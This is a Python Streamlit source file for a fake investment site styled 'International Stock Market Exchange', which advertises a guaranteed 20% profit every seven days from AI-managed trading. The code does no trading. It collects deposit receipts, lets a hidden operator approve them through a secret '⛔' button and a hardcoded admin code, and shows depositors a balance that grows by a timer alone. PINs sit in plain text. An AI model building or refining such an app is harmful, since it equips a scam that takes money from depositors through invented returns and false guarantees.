import streamlit as st
import json
import os
import random
from datetime import datetime, timedelta
from streamlit_autorefresh import st_autorefresh

# ==========================================
# BLOCK 1: DATA ENGINE
# ==========================================
REGISTRY_FILE = "bpsm_registry.json"

def load_registry():
    if os.path.exists(REGISTRY_FILE):
        try:
            with open(REGISTRY_FILE, "r") as f: return json.load(f)
        except: return {}
    return {}

def update_user(name, data):
    reg = load_registry()
    reg[name] = data
    with open(REGISTRY_FILE, "w") as f: 
        json.dump(reg, f, indent=4, default=str)

# ==========================================
# BLOCK 2: UI STYLING (FIXED FLEX-BOX TITLE)
# ==========================================
st.set_page_config(page_title="ISMEX Official", layout="wide")

st.markdown("""
    <style>
    .stApp { background-color: #0e1117; color: white; }
    
    /* THE FLEX BANNER: Keeps everything in 1 line */
    .title-container {
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 10px;
        background-color: #1a1e26;
        border-radius: 10px;
        padding: 25px 10px;
        border: 1px solid #2d303a;
        margin-bottom: 10px;
    }
    
        .main-title { 
        font-weight: bold; 
        font-size: 36px; /* Increased from 24px to 36px */
        background: linear-gradient(90deg, #ff007f, #ffaa00, #00ff88, #00eeff);
        -webkit-background-clip: text; color: transparent;
        margin-right: 5px;
        white-space: nowrap;
        line-height: 1.2;
    }
    
    
    .ad-panel { 
        background: #1c1e26; border-radius: 8px; border: 1px dashed #00eeff; 
        padding: 20px; margin-bottom: 25px; text-align: center;
    }
    .ad-title { color: #00eeff; font-weight: bold; font-size: 14px; margin-bottom: 8px; }
    .ad-text { color: #8c8f99; font-size: 13px; line-height: 1.6; margin: 0; }

    .balance-card { background: #1c1e26; padding: 25px; border-radius: 12px; border: 1px solid #2d303a; text-align: center; margin-bottom: 20px;}
    .cycle-card { background-color: #1c1e26; padding: 20px; border-radius: 12px; border: 1px solid #2d303a; border-left: 4px solid #00ff88; margin-bottom: 15px; }
    
    /* SECRET BUTTON STYLING */
    .stButton>button:contains("⛔") {
        background-color: transparent !important;
        border: none !important;
        color: white !important;
        font-size: 24px !important;
        padding: 0 !important;
        margin: 0 !important;
        width: auto !important;
        box-shadow: none !important;
    }
    </style>
    """, unsafe_allow_html=True)

# ==========================================
# BLOCK 3: AUTH & STEALTH HEADER (FIXED)
# ==========================================
if 'user' not in st.session_state: st.session_state.user = None
if 'is_boss' not in st.session_state: st.session_state.is_boss = False
if 'admin_mode' not in st.session_state: st.session_state.admin_mode = False

if st.session_state.user is None and not st.session_state.is_boss:
    # This container and CSS flex-box keeps the button exactly after the text
    st.markdown('<div class="title-banner">', unsafe_allow_html=True)
    
    # 0.88 to 0.12 ratio ensures the button stays on the far right of the text in one line
    col_text, col_btn = st.columns([0.88, 0.12])
    with col_text:
        st.markdown('<p class="main-title" style="text-align:right;">INTERNATIONAL STOCK MARKET EXCHANGE</p>', unsafe_allow_html=True)
    with col_btn:
        # The Secret Trigger
        if st.button("⛔"): 
            st.session_state.admin_mode = not st.session_state.admin_mode
    st.markdown('</div>', unsafe_allow_html=True)

    # The Restored Full Advertisement
    st.markdown("""
        <div class="ad-panel">
            <p class="ad-title">How We Generate Your Profit:</p>
            <p class="ad-text">
                Your single capital is diversified and <b>cycled multiple times</b> through our advanced AI-managed scalping algorithm every hour. 
                Instead of holding a stock for a year, we take small 0.05% profits from thousands of trades, combining them to provide you 
                with your precise, ticking 20% guaranteed profit over the 7-day cycle. Your money is always moving, never dormant!
            </p>
        </div>
    """, unsafe_allow_html=True)

    # Admin Security Gate
    if st.session_state.admin_mode:
        code = st.text_input("Security Code", type="password", key="admin_gate_key")
        if code == "0102030405":
            st.session_state.is_boss = True
            st.session_state.admin_mode = False
            st.rerun()

    # Standard Login Inputs
    u_name = st.text_input("Username", key="login_user")
    u_pin = st.text_input("PIN", type="password", key="login_pin")
    if st.button("ENTER DASHBOARD", key="login_btn"):
        reg = load_registry()
        if u_name in reg and str(reg[u_name].get('pin')) == str(u_pin):
            st.session_state.user = u_name
            st.rerun()
        else:
            st.error("Access Denied")
            

    

# ==========================================
# BLOCK 4: USER DASHBOARD
# ==========================================
if st.session_state.user:
    st_autorefresh(interval=1000, key="ticker")
    name = st.session_state.user
    data = load_registry().get(name)
    now = datetime.now()
    ROI_PER_SEC = 0.20 / 604800

    st.markdown(f'<div class="balance-card"><p style="color:#8c8f99; font-size:12px;">WITHDRAWABLE BALANCE</p><h1 style="color:#00ff88; margin:0;">₱{data["wallet"]:,.2f}</h1></div>', unsafe_allow_html=True)

    c1, c2 = st.columns(2)
    with c1:
        with st.expander("📥 DEPOSIT"):
            amt = st.number_input("Amount", 1000, step=500)
            if st.file_uploader("Receipt") and st.button("CONFIRM"):
                data.setdefault('tx', []).append({"type":"DEP","amt":amt,"status":"PENDING","date":now.isoformat()})
                update_user(name, data); st.rerun()
    with c2:
        if st.button("LOGOUT"):
            st.session_state.user = None
            st.rerun()

    st.markdown("### ⌛ ACTIVE CYCLES")
    for inv in reversed(data.get('inv', [])):
        st_t, et_t = datetime.fromisoformat(inv['start']), datetime.fromisoformat(inv['end'])
        if now < et_t:
            val = inv['amt'] * ROI_PER_SEC * (now - st_t).total_seconds()
            time_str = str(et_t - now).split('.')[0]
        else:
            val = inv['amt'] * 0.20
            time_str = "MATURED"

        st.markdown(f"""
            <div class="cycle-card">
                <p style="margin:0; color:white;">Capital: <b>₱{inv['amt']:,}</b></p>
                <h2 style="color:#00ff88; margin:0; font-family:monospace;">₱{val:,.4f}</h2>
                <p style="color:#ff4b4b; margin:0; font-weight:bold;">⌛ {time_str}</p>
            </div>
        """, unsafe_allow_html=True)

# ==========================================
# BLOCK 5: ADMIN
# ==========================================
elif st.session_state.is_boss:
    st.title("👑 ADMIN")
    reg = load_registry()
    for u_n, u_d in reg.items():
        for i, tx in enumerate(u_d.get('tx', [])):
            if tx['status'] == "PENDING":
                if st.button(f"APPROVE {u_n} ₱{tx['amt']}", key=f"a_{u_n}_{i}"):
                    tx['status'] = "SUCCESS"
                    if tx['type'] == "DEP":
                        u_d.setdefault('inv', []).append({"amt":tx['amt'], "start":datetime.now().isoformat(), "end":(datetime.now()+timedelta(days=7)).isoformat()})
                    update_user(u_n, u_d); st.rerun()
    if st.button("EXIT"): st.session_state.is_boss = False; st.rerun()
        
